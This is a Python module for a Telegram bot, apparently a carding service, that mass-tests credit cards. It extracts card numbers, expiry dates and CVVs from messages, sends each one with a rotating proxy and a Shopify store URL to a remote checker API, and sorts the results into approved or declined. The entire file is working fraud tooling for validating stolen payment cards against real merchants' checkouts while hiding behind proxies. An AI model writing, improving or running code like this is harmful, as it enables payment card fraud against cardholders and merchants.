# msh.py - Mass Shopify Checker para SaitamaChk (FINAL)

import re
import time
import random
import asyncio
import aiohttp

import db
from antispam import antispam_guard
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler, MessageHandler, filters

BOT_TAG = '<a href="http://t.me/SaitamaChecker_Bot">[拳]</a>'

# ==============================
# CONFIG - NUEVA API
# ==============================

API_URL = "https://shopi-production-7ef9.up.railway.app/"
REQUEST_TIMEOUT = 60
CONNECT_TIMEOUT = 20
MAX_CCS = 20

CC_REGEX = r'(\d{14,16})[:,;/|•\s]+(\d{1,2})[:,;/|•\s]+(\d{2,4})[:,;/|•\s]+(\d{3,4})'

busy_users = {}

# ==============================
# LIMITES PERSONALES
# ==============================

def get_personal_limit(uid: int) -> int:
    if db.is_owner(uid) or db.is_admin(uid) or db.is_premium(uid):
        return 4
    return 2

def can_run(uid: int) -> bool:
    return busy_users.get(uid, 0) < get_personal_limit(uid)

def mark_start(uid: int):
    busy_users[uid] = busy_users.get(uid, 0) + 1

def mark_end(uid: int):
    if uid in busy_users:
        busy_users[uid] -= 1
        if busy_users[uid] <= 0:
            del busy_users[uid]

# ==============================
# HELPERS
# ==============================

def extract_card(text):
    m = re.search(CC_REGEX, text)
    if not m:
        return None

    n, mm, yy, cvv = m.groups()
    return {
        "number": n,
        "month": mm.zfill(2),
        "year": yy[-2:],
        "cvv": cvv
    }

def build_cc(card):
    year = f"20{card['year']}" if int(card["year"]) <= 50 else f"19{card['year']}"
    return f"{card['number']}|{card['month']}|{year}|{card['cvv']}"

def format_site(site: str) -> str:
    return site if site.startswith("http") else f"https://{site}"

def format_proxy(proxy: str) -> str:
    return proxy if proxy.count(":") >= 3 else f"{proxy}:user:pass"

# ==============================
# STATUS (MISMO QUE .SH)
# ==============================

def status_from_response(resp: str) -> str:
    if not resp:
        return "Error ⚠️"

    r = resp.upper().replace(" ", "_")

    APPROVED = [
        "3D_AUTHENTICATION",
        "INSUFFICIENT_FUNDS",
        "INCORRECT_ZIP",
        "ORDER_COMPLETED",
        "ORDER_PLACED",
        "THANK_YOU"
    ]

    APPROVED_CCN = [
        "INCORRECT_CVC",
        "INVALID_CVC"
    ]

    DECLINED = [
        "CARD_DECLINED",
        "GENERIC_ERROR",
        "INCORRECT_NUMBER",
        "PROCESSING_ERROR",
        "FRAUD_SUSPECTED",
        "RISKY"
    ]

    if any(x in r for x in APPROVED):
        return "Approved ✅"
    if any(x in r for x in APPROVED_CCN):
        return "Approved CCN ✅"
    if any(x in r for x in DECLINED):
        return "Declined ❌"

    return "Error ⚠️"

# ==============================
# API CALL
# ==============================

async def check_shopify(card, site, proxy):
    params = {
        "cc": build_cc(card),
        "url": format_site(site),
        "proxy": format_proxy(proxy)
    }

    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)

    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(API_URL, params=params) as r:
                if r.status != 200:
                    return {"gateway": "Normal", "price": "0", "response": f"HTTP_{r.status}"}

                data = await r.json()
                return {
                    "gateway": data.get("Gate", "Normal"),
                    "price": data.get("Price", "0"),
                    "response": data.get("Response", "N/A")
                }
    except asyncio.TimeoutError:
        return {"gateway": "Normal", "price": "0", "response": "TIMEOUT"}
    except Exception as e:
        return {"gateway": "Normal", "price": "0", "response": str(e)[:60]}

# ==============================
# /MSH
# ==============================

async def handle_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = update.effective_user.username or update.effective_user.first_name
    msg = update.message

    if not await antispam_guard(update, context):
        return

    if not can_run(uid):
        await msg.reply_text("⏳ Límite de ejecuciones simultáneas alcanzado.", reply_to_message_id=msg.message_id)
        return

    if not db.get_user(uid):
        await msg.reply_text("❌ Debes registrarte primero.", reply_to_message_id=msg.message_id)
        return

    sites = db.get_user_shopify_sites(uid)
    proxies = db.get_user_proxies(uid)

    if not sites or not proxies:
        await msg.reply_text("❌ Necesitas sitios Shopify y proxies.", reply_to_message_id=msg.message_id)
        return

    raw = msg.text.split(maxsplit=1)
    if len(raw) < 2:
        await msg.reply_text("⚠️ Uso: <code>/msh lista_de_ccs</code>", parse_mode="HTML", reply_to_message_id=msg.message_id)
        return

    lines = [l.strip() for l in raw[1].splitlines() if l.strip()]
    if len(lines) > MAX_CCS:
        await msg.reply_text(f"❌ Máximo permitido: {MAX_CCS} CCs", reply_to_message_id=msg.message_id)
        return

    cards = [extract_card(l) for l in lines if extract_card(l)]
    if not cards:
        await msg.reply_text("❌ No se detectaron CCs válidas.", reply_to_message_id=msg.message_id)
        return

    mark_start(uid)
    status_msg = await msg.reply_text("🔄 Checking...", reply_to_message_id=msg.message_id)

    start = time.time()
    blocks = []

    try:
        for card in cards:
            site_i = random.randrange(len(sites))
            proxy_i = random.randrange(len(proxies))

            site = sites[site_i]
            proxy = proxies[proxy_i]

            data = await check_shopify(card, site, proxy)
            status = status_from_response(data["response"])

            blocks.append(
                f"<b>CC:</b> <code>{build_cc(card)}</code>\n"
                f"<b>Status:</b> <code>{status}</code>\n"
                f"<b>Response:</b> <code>{data['response']}</code>\n"
                f"<b>Gateway:</b> <code>{data['gateway']} {data['price']}</code>\n"
                f"<b>Site:</b> {site_i + 1} | <b>Proxy:</b> {proxy_i + 1}\n"
                "━━━━━━━━━━━━━━\n"
            )

        elapsed = time.time() - start

        final = (
            f"{BOT_TAG} <b>Mass Shopify</b>\n"
            "━━━━━━━━━━━━━━━━\n"
            + "".join(blocks) +
            "━━━━━━━━━━━━━━━━\n"
            f"{BOT_TAG} <b>Total:</b> {len(cards)} | <b>Time:</b> {elapsed:.2f}s\n"
            f"{BOT_TAG} <b>Req by:</b> @{user}"
        )

        await status_msg.edit_text(final, parse_mode="HTML", disable_web_page_preview=True)

    finally:
        mark_end(uid)

# ==============================
# REGISTER
# ==============================

def register_handlers(application):
    application.add_handler(CommandHandler("msh", handle_msh))
    application.add_handler(MessageHandler(filters.Regex(r"^\.msh\b"), handle_msh))